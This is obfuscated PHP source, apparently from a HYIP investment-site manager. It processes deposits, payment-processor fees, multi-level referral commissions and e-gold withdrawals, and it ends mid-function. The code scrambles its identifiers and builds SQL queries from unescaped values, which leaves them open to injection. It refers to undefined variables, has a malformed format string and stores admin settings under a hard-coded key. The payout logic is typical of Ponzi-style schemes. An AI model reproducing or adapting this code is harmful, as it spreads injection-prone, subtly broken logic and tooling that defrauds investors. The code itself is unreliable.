<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function elnlcmgmbo ($elnlcDLLME)
  {
    $elnlcCDlqo = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $elnlcDLLME, $elnlcCDlqo))
    {
      $elnlcDLLME = $elnlcCDlqo[1];
    }

    return $elnlcDLLME;
  }

  function elnlcdefep ($elnlcDLLME, $elnlcubgM, $d)
  {
    global $elnlcFAei;
    $elnlctcyj = ($elnlcDLLME + 48273) % $elnlcubgM;
    $elnlcnodr = $elnlcFAei['elnlczkHC'];
    $elnlcwbnMF = $elnlctcyj;
    while ($elnlcnodr == 0)
    {
      if ($d[$elnlctcyj] != -1)
      {
        ++$elnlctcyj;
        if ($elnlctcyj == $elnlcubgM)
        {
          $elnlctcyj = $elnlcFAei['elnlczkHC'];
          continue;
        }

        continue;
      }

      $elnlcnodr = $elnlcFAei['elnlcuNxfU'];
    }

    return $elnlctcyj;
  }

  function elnlcsfhkv ($elnlcDLLME, $elnlcubgM, $d)
  {
    global $elnlcFAei;
    $elnlctcyj = ($elnlcDLLME + 48273) % $elnlcubgM;
    $elnlcnodr = $elnlcFAei['elnlczkHC'];
    while (!$elnlcnodr)
    {
      if ($d[$elnlctcyj] == -1)
      {
        ++$elnlctcyj;
        if ($elnlctcyj == $elnlcubgM)
        {
          $elnlctcyj = $elnlcFAei['elnlczkHC'];
          continue;
        }

        continue;
      }

      $elnlcnodr = $elnlcFAei['elnlcuNxfU'];
    }

    return $elnlctcyj;
  }

  function elnlcinpqd ()
  {
    global $elnlcFAei;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcLjgi;
    global $elnlcGWAnG;
    $q = 'select * from hm2_users where id = 1';
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    $elnlcsLyR = array ();
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlcsLyR = array ();
      $z = elnlcpewp ($elnlctLoC[$elnlcFAei['elnlcyNlj']], '&hd,mnf(fska$d3jlkfsda' . $elnlcGWAnG[$elnlcFAei['elnlcBgyc']]);
      $elnlcsLyR = unserialize ($z);
    }

    return $elnlcsLyR;
  }

  function elnlcgtom ()
  {
    global $elnlcFAei;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcLjgi;
    global $elnlctbbB;
    global $elnlcGWAnG;
    $z = elnlcqedaf (elnlcgzbyk (serialize ($elnlctbbB), '&hd,mnf(fska$d3jlkfsda' . $elnlcGWAnG[$elnlcFAei['elnlcBgyc']]));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function elnlciegzf ($elnlcEFPiH, $elnlcwnpbc, $elnlcLMULg, $elnlcfJcI, $elnlcrIPNm, $elnlcTJoSQ, $elnlcPJFLE)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    global $elnlcURTi;
    $elnlcPJFLE = intval ($elnlcPJFLE);
    $elnlcTJoSQ = intval ($elnlcTJoSQ);
    $elnlcwnpbc = intval ($elnlcwnpbc);
    $elnlcLMULg = sprintf ('%.02f', $elnlcLMULg);
    $elnlcTGAnD = elnlcqedaf ($elnlcfJcI);
    $elnlcDMQN = $elnlcFAei['elnlczkHC'];
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $elnlcEFPiH . ' && type = \'add_funds\' && description like \'%Batch id = ' . $elnlcTGAnD . '\'';
    $elnlcSQAa = mysql_query ($q);
    $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
    if (0 < $elnlctLoC[$elnlcFAei['elnlcGIccT']])
    {
      $elnlcDMQN = $elnlcFAei['elnlcuNxfU'];
    }

    if ($elnlcDMQN == 1)
    {
      return 0;
    }

    $elnlcvlMn = 'Add funds to account from ' . $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']] . ('' . '. Batch id = ' . $elnlcfJcI);
    if (($elnlcEFPiH == 4 AND $elnlcGWAnG[$elnlcFAei['elnlcVcGDh']] == 1))
    {
      $elnlcvlMn = 'Add funds to account from ' . $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']] . ('' . ' ' . $elnlcLMULg . ' - StormPay Fee. Batch id = ' . $elnlcfJcI);
      $elnlcLMULg = $elnlcLMULg - $elnlcLMULg * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($elnlcEFPiH == 4 AND $elnlcGWAnG[$elnlcFAei['elnlcKrTFT']] == 1))
      {
        $elnlcvlMn = 'Add funds to account from ' . $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']] . ('' . ' ' . $elnlcLMULg . ' - StormPay Fee. Batch id = ' . $elnlcfJcI);
        $elnlcLMULg = $elnlcLMULg - $elnlcLMULg * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $elnlcGWAnG[$elnlcFAei['elnlcqEgCD']])
    {
      $elnlcFaLUq = sprintf ('%0.2', $elnlcLMULg * $elnlcGWAnG[$elnlcFAei['elnlcqEgCD']] / 100);
      if ($elnlcFaLUq < $elnlcGWAnG[$elnlcFAei['elnlcbnlk']])
      {
        $elnlcFaLUq = $elnlcGWAnG[$elnlcFAei['elnlcbnlk']];
      }

      $elnlcLMULg = $elnlcLMULg - $elnlcFaLUq;
      $elnlcvlMn .= '' . '. Deposit fee - ' . $elnlcFaLUq;
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcvrEI'])
    {
      $elnlcEFPiH = $elnlcFAei['elnlcOsIFg'];
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $elnlcwnpbc . ',
        	amount = \'' . $elnlcLMULg . '\',
        	type = \'add_funds\',
        	description = \'' . $elnlcvlMn . '\',
        	actual_amount = ' . $elnlcLMULg . ',
        	ec = ' . $elnlcEFPiH . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $elnlcTJoSQ;
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    $elnlcJgfER = '';
    $elnlcevhVC = mysql_fetch_array ($elnlcSQAa);
    $elnlcwhGPh = -1;
    if ($elnlcevhVC)
    {
      $elnlcwhGPh += $elnlctLoC[$elnlcFAei['elnlcpSpq']];
      $elnlcJgfER = elnlcqedaf ($elnlcevhVC[$elnlcFAei['elnlcgjvwt']]);
      if ($elnlcevhVC[$elnlcFAei['elnlcepPbi']] == 0)
      {
        $elnlcPJFLE = $elnlcFAei['elnlczkHC'];
      }
      else
      {
        if ($elnlcevhVC[$elnlcFAei['elnlcAjrwP']] == 0)
        {
          $elnlcevhVC[$elnlcFAei['elnlcAjrwP']] = $elnlcLMULg + 1;
        }

        if (($elnlcevhVC[$elnlcFAei['elnlcQwWv']] <= $elnlcLMULg AND $elnlcLMULg <= $elnlcevhVC[$elnlcFAei['elnlcAjrwP']]))
        {
          if ($elnlcevhVC[$elnlcFAei['elnlcxKaI']] == 1)
          {
            $elnlcjKTz = preg_split ('/\\s*,\\s*/', $elnlcevhVC[$elnlcFAei['elnlclPAj']]);
            if (!in_array ($elnlcPJFLE, $elnlcjKTz))
            {
              $elnlcPJFLE = $elnlcjKTz[0];
            }
          }
          else
          {
            if ($elnlcPJFLE < $elnlcevhVC[$elnlcFAei['elnlcapbeA']])
            {
              $elnlcPJFLE = $elnlcevhVC[$elnlcFAei['elnlcapbeA']];
            }

            if ($elnlcevhVC[$elnlcFAei['elnlcnWEG']] < $elnlcPJFLE)
            {
              $elnlcPJFLE = $elnlcevhVC[$elnlcFAei['elnlcnWEG']];
            }
          }
        }
        else
        {
          $elnlcPJFLE = $elnlcFAei['elnlczkHC'];
        }
      }
    }

    if ($elnlcwhGPh < 0)
    {
      $elnlcwhGPh = $elnlcFAei['elnlczkHC'];
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $elnlcTJoSQ;
    $elnlcEDGJw = mysql_query ($q);
    $elnlceJGNn = mysql_fetch_array ($elnlcEDGJw);
    $elnlcTVJGb = $elnlceJGNn[$elnlcFAei['elnlciLLU']];
    $elnlcVLdS = $elnlceJGNn[$elnlcFAei['elnlcsjJRE']];
    if (($elnlcTVJGb <= $elnlcLMULg AND $elnlcLMULg <= $elnlcVLdS))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $elnlcwnpbc . ',
          	type_id = ' . $elnlcTJoSQ . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $elnlcwhGPh . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $elnlcLMULg . '\',
          	actual_amount = \'' . $elnlcLMULg . '\',
          	ec = ' . $elnlcEFPiH . ',
          	compound = ' . $elnlcPJFLE . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $elnlcUapL = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $elnlcwnpbc . ',
          	amount = \'-' . $elnlcLMULg . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . elnlcqedaf ($elnlcJgfER) . ('' . '\',
          	actual_amount = -' . $elnlcLMULg . ',
          	ec = ' . $elnlcEFPiH . ',
          	date = now(),
                deposit_id = ' . $elnlcUapL . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcGfcCL'])
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlcDzHM[$elnlcFAei['elnlcaQNFH']];
        mysql_query ($q);
      }

      if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcRirVy'])
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $elnlcwnpbc;
        ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
        $elnlciEtU = $elnlcFAei['elnlczkHC'];
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlciEtU = $elnlctLoC[$elnlcFAei['elnlcFxzO']];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
        $elnlcLSUE = $elnlcFAei['elnlcQxnB'];
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcLSUE = $elnlctLoC[$elnlcFAei['elnlcFxzO']];
        }

        if (($elnlciEtU == 1 AND $elnlcLSUE <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $elnlcwnpbc . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $elnlcEFPiH . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcGWAnG[$elnlcFAei['elnlcDbidg']] == 1)
      {
        $elnlcPryOu = $elnlcFAei['elnlczkHC'];
        if (0 < $elnlcGWAnG[$elnlcFAei['elnlcsDMSv']])
        {
          $elnlcPryOu = $elnlcLMULg * 1000 / $elnlcGWAnG[$elnlcFAei['elnlcsDMSv']];
        }

        if (0 < $elnlcPryOu)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $elnlcPryOu . ' where id = ' . $elnlcwnpbc;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $elnlcWiSR = elnlcihffb ($elnlcwnpbc, $elnlcLMULg, $elnlcEFPiH);
    }
    else
    {
      $elnlcJgfER = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $elnlcwnpbc;
    $elnlcSQAa = mysql_query ($q);
    $elnlcJiSD = mysql_fetch_array ($elnlcSQAa);
    $elnlcQtyf = array ($elnlcJiSD);
    $elnlcQtyf[$elnlcFAei['elnlcrMbQT']] = $elnlcJiSD[$elnlcFAei['elnlcrMbQT']];
    $elnlcQtyf[$elnlcFAei['elnlcgjvwt']] = $elnlcJiSD[$elnlcFAei['elnlcgjvwt']];
    $elnlcQtyf[$elnlcFAei['elnlcBBFw']] = number_format ($elnlcLMULg, 2);
    $elnlcQtyf[$elnlcFAei['elnlcDiPr']] = $elnlcrIPNm;
    $elnlcQtyf[$elnlcFAei['elnlcvvGo']] = $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']];
    $elnlcQtyf[$elnlcFAei['elnlcvQzwa']] = $elnlcfJcI;
    $elnlcQtyf[$elnlcFAei['elnlcdeOG']] = $elnlcPJFLE;
    $elnlcQtyf[$elnlcFAei['elnlcMolR']] = elnlcmgmbo ($elnlcJgfER);
    $elnlcQtyf[$elnlcFAei['elnlchvsH']] = $elnlcWiSR;
    $elnlcQtyf[$elnlcFAei['elnlcsEdJl']] = '[no upline]';
    if (0 < $elnlcJiSD[$elnlcFAei['elnlcycBJh']])
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcJiSD[$elnlcFAei['elnlcycBJh']];
      ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
      while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
      {
        $elnlcQtyf[$elnlcFAei['elnlcsEdJl']] = $elnlctLoC[$elnlcFAei['elnlcrMbQT']];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $elnlcSQAa = mysql_query ($q);
    $elnlcFbyMN = '';
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlcFbyMN = $elnlctLoC[$elnlcFAei['elnlcMQrH']];
    }

    elnlcqayqa ('deposit_admin_notification', $elnlcFbyMN, $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcQtyf);
    elnlcqayqa ('deposit_user_notification', $elnlcJiSD[email], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcQtyf);
    return 1;
  }

  function elnlcihffb ($elnlcwnpbc, $elnlcLMULg, $elnlcEFPiH)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    global $elnlcURTi;
    $q = '' . 'select * from hm2_users where id = ' . $elnlcwnpbc;
    $elnlcEjKJ = mysql_query ($q);
    $elnlcCpTR = mysql_fetch_array ($elnlcEjKJ);
    if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcvrEI'])
    {
      $elnlcmaLP = $elnlcLKzAo[$elnlcFAei['elnlcycBJh']];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcmaLP;
      $elnlcSQAa = mysql_query ($q);
      $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
      if ($elnlctLoC[$elnlcFAei['elnlcGIccT']] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $elnlcmaLP;
      $elnlcSQAa = mysql_query ($q);
      $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
      if ($elnlctLoC[$elnlcFAei['elnlcdtfoc']] < 3000)
      {
        $elnlcFrMj = $elnlcFAei['elnlczkHC'];
        return 0;
      }
      else
      {
        if ($elnlctLoC[$elnlcFAei['elnlcdtfoc']] < 6000)
        {
          $elnlcFrMj = 0.0200000000000000004163336;
        }
        else
        {
          if ($elnlctLoC[$elnlcFAei['elnlcdtfoc']] < 12000)
          {
            $elnlcFrMj = 0.0500000000000000027755576;
          }
          else
          {
            $elnlcFrMj = 0.100000000000000005551115;
          }
        }
      }

      $elnlcpnqhK = $elnlcLMULg * $elnlcFrMj;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $elnlcmaLP . ',
      	amount = ' . $elnlcpnqhK . ',
      	actual_amount = ' . $elnlcpnqhK . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . elnlcqedaf ($elnlcCpTR[$elnlcFAei['elnlcrMbQT']]) . ('' . '\',
      	ec = ' . $elnlcEFPiH . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $elnlcmaLP;
      $elnlcEjKJ = mysql_query ($q);
      $elnlcpHQh = mysql_fetch_array ($elnlcEjKJ);
      $elnlcpHQh[$elnlcFAei['elnlcBBFw']] = number_format ($elnlcpnqhK, 2);
      $elnlcpHQh[$elnlcFAei['elnlcSHVON']] = $elnlcCpTR[$elnlcFAei['elnlcrMbQT']];
      $elnlcpHQh[$elnlcFAei['elnlcTwJa']] = $elnlcCpTR[$elnlcFAei['elnlcgjvwt']];
      $elnlcpHQh[$elnlcFAei['elnlcvvGo']] = $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']];
      elnlcqayqa ('referral_commision_notification', $elnlcpHQh[$elnlcFAei['elnlcMQrH']], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcpHQh);
    }

    $elnlcWiSR = $elnlcFAei['elnlczkHC'];
    if ($elnlcGWAnG[$elnlcFAei['elnlcxsJU']] == 1)
    {
      $elnlcmaLP = $elnlcFAei['elnlczkHC'];
      if (0 < $elnlcCpTR[$elnlcFAei['elnlcycBJh']])
      {
        $elnlcmaLP = $elnlcCpTR[$elnlcFAei['elnlcycBJh']];
      }
      else
      {
        return 0;
      }

      if ($elnlcGWAnG[$elnlcFAei['elnlcHFUu']])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcmaLP;
        $elnlcSQAa = mysql_query ($q);
        $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
        if ($elnlctLoC[$elnlcFAei['elnlcGIccT']] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $elnlcGWAnG[$elnlcFAei['elnlcijgB']] AND $elnlcLMULg < $elnlcGWAnG[$elnlcFAei['elnlcijgB']]))
      {
        return 0;
      }

      if ($elnlcGWAnG[$elnlcFAei['elnlcMOqBf']] == 1)
      {
        if (0 < $elnlcGWAnG[$elnlcFAei['elnlcjTsML']])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcwnpbc;
          $elnlcSQAa = mysql_query ($q);
          $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
          if ($elnlctLoC[$elnlcFAei['elnlcGIccT']] == 1)
          {
            $elnlcpnqhK = $elnlcGWAnG[$elnlcFAei['elnlcjTsML']];
            $elnlcWiSR += $elnlcpnqhK;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcmaLP . ',
    		amount = ' . $elnlcpnqhK . ',
    		actual_amount = ' . $elnlcpnqhK . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcqedaf ($elnlcCpTR[$elnlcFAei['elnlcrMbQT']]) . ('' . '\',
    		ec = ' . $elnlcEFPiH . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $elnlcmaLP;
            $elnlcEjKJ = mysql_query ($q);
            $elnlcpHQh = mysql_fetch_array ($elnlcEjKJ);
            $elnlcpHQh[$elnlcFAei['elnlcBBFw']] = number_format ($elnlcpnqhK, 2);
            $elnlcpHQh[$elnlcFAei['elnlcSHVON']] = $elnlcCpTR[$elnlcFAei['elnlcrMbQT']];
            $elnlcpHQh[$elnlcFAei['elnlcTwJa']] = $elnlcCpTR[$elnlcFAei['elnlcgjvwt']];
            $elnlcpHQh[$elnlcFAei['elnlcvvGo']] = $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']];
            elnlcqayqa ('referral_commision_notification', $elnlcpHQh[$elnlcFAei['elnlcMQrH']], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcpHQh);
          }
        }
      }
      else
      {
        if ($elnlcGWAnG[$elnlcFAei['elnlcuinE']] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcmaLP . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $elnlcmaLP;
        }

        $elnlcSQAa = mysql_query ($q);
        if ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlccriA = $elnlctLoC[$elnlcFAei['elnlcFxzO']];
          $q = '' . 'select * from hm2_users where id = ' . $elnlcmaLP;
          $elnlcEjKJ = mysql_query ($q);
          $elnlcpVvFi = mysql_fetch_array ($elnlcEjKJ);
          $elnlcSTwpU = @unserialize ($elnlcpVvFi[$elnlcFAei['elnlcBNaO']]);
          if (isset ($elnlcSTwpU[$elnlcFAei['elnlcOnpGT']]))
          {
            $j = $elnlcFAei['elnlcuNxfU'];
            while (isset ($elnlcSTwpU['ref_percent' . $j]))
            {
              if (($elnlcSTwpU['ref_percent' . $j][0] <= $elnlccriA AND $elnlccriA <= $elnlcSTwpU['ref_percent' . $j][1]))
              {
                $elnlcpnqhK = $elnlcLMULg * $elnlcSTwpU['ref_percent' . $j][2] / 100;
                $elnlcWiSR += $elnlcpnqhK;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlckszt'])
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $elnlcmaLP;
              $elnlcSQAa = mysql_query ($q);
              $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
              $elnlcFrMj = $elnlcFAei['elnlczkHC'];
              if (10000 <= $elnlctLoC[$elnlcFAei['elnlcdtfoc']])
              {
                $elnlcFrMj = $elnlcFAei['elnlcIoJUM'];
              }
              else
              {
                if (5000 <= $elnlctLoC[$elnlcFAei['elnlcdtfoc']])
                {
                  $elnlcFrMj = $elnlcFAei['elnlcOqJw'];
                }
                else
                {
                  if (3000 <= $elnlctLoC[$elnlcFAei['elnlcdtfoc']])
                  {
                    $elnlcFrMj = $elnlcFAei['elnlcuTHGi'];
                  }
                  else
                  {
                    if (1000 <= $elnlctLoC[$elnlcFAei['elnlcdtfoc']])
                    {
                      $elnlcFrMj = $elnlcFAei['elnlcnkgEB'];
                    }
                  }
                }
              }

              if (0 < $elnlcFrMj)
              {
                if (4 <= $elnlccriA)
                {
                  $elnlcFrMj += 3;
                }

                $elnlcpnqhK = $elnlcLMULg * $elnlcFrMj / 100;
                $elnlcWiSR += $elnlcpnqhK;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcmaLP . ',
    		amount = ' . $elnlcpnqhK . ',
    		actual_amount = ' . $elnlcpnqhK . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcqedaf ($elnlcCpTR[$elnlcFAei['elnlcrMbQT']]) . ('' . '\',
    		ec = ' . $elnlcEFPiH . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $elnlccriA . ' and (to_value >= ' . $elnlccriA . ' or to_value = 0) order by from_value desc limit 1';
              ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
              if ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
              {
                $elnlcpnqhK = $elnlcLMULg * $elnlctLoC[$elnlcFAei['elnlcaCGMK']] / 100;
                $elnlcWiSR += $elnlcpnqhK;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcmaLP . ',
    		amount = ' . $elnlcpnqhK . ',
    		actual_amount = ' . $elnlcpnqhK . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcqedaf ($elnlcCpTR[$elnlcFAei['elnlcrMbQT']]) . ('' . '\',
    		ec = ' . $elnlcEFPiH . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcmaLP;
          $elnlcEjKJ = mysql_query ($q);
          $elnlcpHQh = mysql_fetch_array ($elnlcEjKJ);
          $elnlcpHQh[$elnlcFAei['elnlcBBFw']] = number_format ($elnlcpnqhK, 2);
          $elnlcpHQh[$elnlcFAei['elnlcSHVON']] = $elnlcCpTR[$elnlcFAei['elnlcrMbQT']];
          $elnlcpHQh[$elnlcFAei['elnlcTwJa']] = $elnlcCpTR[$elnlcFAei['elnlcgjvwt']];
          $elnlcpHQh[$elnlcFAei['elnlcvvGo']] = $elnlcURTi[$elnlcEFPiH][$elnlcFAei['elnlcgjvwt']];
          elnlcqayqa ('referral_commision_notification', $elnlcpHQh[$elnlcFAei['elnlcMQrH']], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcpHQh);
        }
      }

      if ($elnlcGWAnG[$elnlcFAei['elnlcMOqBf']] != 1)
      {
        for ($i = $elnlcFAei['elnlcOHKNB']; $i < 11; ++$i)
        {
          if (($elnlcmaLP == 0 OR $elnlcGWAnG['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $elnlcGWAnG['ref' . $i . '_cms_minamount'] AND $elnlcLMULg < $elnlcGWAnG['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcmaLP;
          $elnlcSQAa = mysql_query ($q);
          $elnlcmaLP = $elnlcFAei['elnlczkHC'];
          while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
          {
            $elnlcmaLP = $elnlctLoC[$elnlcFAei['elnlcycBJh']];
            if (0 < $elnlcmaLP)
            {
              $elnlcJHAi = $elnlcFAei['elnlcuNxfU'];
              if ($elnlcGWAnG[$elnlcFAei['elnlcHFUu']] == 1)
              {
                $elnlcJHAi = $elnlcFAei['elnlczkHC'];
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcmaLP;
                $elnlcBWFue = mysql_query ($q);
                $elnlcMoNg = mysql_fetch_array ($elnlcBWFue);
                if (0 < $elnlcMoNg[$elnlcFAei['elnlcGIccT']])
                {
                  $elnlcJHAi = $elnlcFAei['elnlcuNxfU'];
                }
              }

              if ($elnlcJHAi == 1)
              {
                $elnlcpnqhK = $elnlcLMULg * $elnlcGWAnG['ref' . $i . '_cms'] / 100;
                $elnlcWiSR += $elnlcpnqhK;
                $q = 'insert into hm2_history set
                  user_id = ' . $elnlctLoC[$elnlcFAei['elnlcycBJh']] . ('' . ',
                  amount = ' . $elnlcpnqhK . ',
                  actual_amount = ' . $elnlcpnqhK . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . elnlcqedaf ($elnlcCpTR[$elnlcFAei['elnlcrMbQT']]) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $elnlcEFPiH . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $elnlcWiSR;
  }

  function elnlcqsbia ($elnlcrIPNm, $elnlcEFPiH)
  {
    global $elnlcFAei;
    global $elnlcURTi;
    $elnlcEFPiH = intval ($elnlcEFPiH);
    $elnlcrIPNm = elnlcqedaf ($elnlcrIPNm);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $elnlcEFPiH . '=' . $elnlcrIPNm . '\'';
    $elnlcSQAa = mysql_query ($q);
    $elnlctLoC = mysql_fetch_assoc ($elnlcSQAa);
    if (0 < $elnlctLoC[$elnlcFAei['elnlcGIccT']])
    {
      return array (0, 'Blacklisted ' . $elnlcURTi[$elnlcEFPiH] . ' account ' . $elnlcrIPNm);
    }

    return array (1, '');
  }

  function elnlcwqie ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 0);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcfkaO = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        $elnlcfkaO = $elnlchAzqM;
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
